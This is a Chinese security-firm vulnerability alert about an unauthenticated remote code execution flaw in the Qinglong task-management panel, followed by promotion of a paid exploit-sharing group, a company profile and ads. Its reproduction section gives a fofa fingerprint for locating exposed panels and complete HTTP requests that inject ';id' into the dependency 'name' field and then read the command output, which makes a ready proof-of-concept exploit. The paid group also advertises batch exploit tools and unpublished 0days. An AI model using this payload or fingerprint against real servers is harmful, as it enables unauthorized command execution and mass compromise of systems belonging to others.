#  【漏洞预警】青龙面板 网站管理系统 dependencies 远程代码执行漏洞  
by 融云安全-sm
                    by 融云安全-sm  融云攻防实验室   2026-03-06 01:54  
  
**0x01 阅读须知**  
  
**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！**  
  
**0x02 漏洞描述**  
  
青龙面板是一款基于Web的自动化任务管理与网站资源管理工具，旨在帮助用户高效处理各类定时任务、脚本执行与网站运维工作。‌  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrjhibhe8icAEd4Rks8T2BysFs7iblyb8WSCOfUzicd1r9lQOaQj3icXdia2LFyIvicu4KCz1QJS0PxW1Daw6SGMR577xWvV6ibCH8R0iapA/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
**0x03 漏洞复现**  
  
f  
ofa  
：  
icon_hash=="-254502902"  
  
1.执行id命令访问未授权接口得到结果  
```
POST /Api/dependencies HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Content-Length: 47
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
[
  {
   "name": ";id",
   "type": 0
  }
]
```  
```
GET /Api/dependencies HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrgwXeSUnFicgGZ1zKSSu9kH6oW85JaM5T40ibycWJI0VC1GdNFI5Ht8CoWziaKXKTrPib1pdTZYdia5UCAWzoWWbVX96EzEXqoVIzQE/640?wx_fmt=png&from=appmsg "")  
  
2.渝融云NTM入侵检测系统已支持青龙面板攻击检测  
（入侵检测合作可私聊公众号）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrjiciaTxblSQhNFRbPrFPam3LHZafQLqDLMGtmVlicr0iblNzHqQOicDkrb8OXX7RRn23W6IqJHylcsRhsJjbqK1yWvVq4npzYaGjWY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrias3H5mgz41rCCvary7lK2QzcKO62bM9zkPLjsIsXPfZkliaYKJ7FJK9mPuib0fzBf4CvjiaZpKB9hSYIQIvFJSAcsYpmhM3pw8Cs/640?wx_fmt=png&from=appmsg "")  
  
3.nuclei图形化检测工具和poc已公布在星球  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrgWY9ahicJHqeq038DAGS2uuAiaCM8eKOibn4icOjR3OvEGrBKTCfdFpUcH9sfeu5aEcr75zbTFgiaKQ8H0QPjQteMOZ5KaTibhOQHaA/640?wx_fmt=png&from=appmsg "")  
  
**最后给兄弟们推荐下圈子，高质量漏洞利用研究，代码审计圈子，每周至少更新三个0Day/Nday及对应漏洞的批量利用工具，团队内部POC，源码分享，星球不定时更新内外网攻防渗透技巧以及最新学习，SRC研究报告等。**  
  
**【圈子权益】**  
  
**1，一年至少200+漏洞Poc及对应漏洞批量利用工具**  
  
**2，各种漏洞利用工具及后续更新，渗透工具、文档资源分享**  
  
**3，内部漏洞库情报分享（目前已有1000+poc，会每日更新，包括部分未公开0/1day）**  
  
**圈子目前价格为59元，现在星球有1000+位师傅相信并选择加入我们**  
  
****  
****  
**0x05 公司简介**  
  
江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
  
   公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......  
****  
  
广告：  
CNNVD二级和三级申请、续期私聊找我对话，价格便宜童叟无欺！  
  
**编制：sm**  
  
**审核：fjh**  
  
**审核：Dog**  
  
****  
**1个1朵********5毛钱**  
  
**天天搬砖的小M**  
  
**能不能吃顿好的**  
  
**就看你们的啦**  
  
****  
  
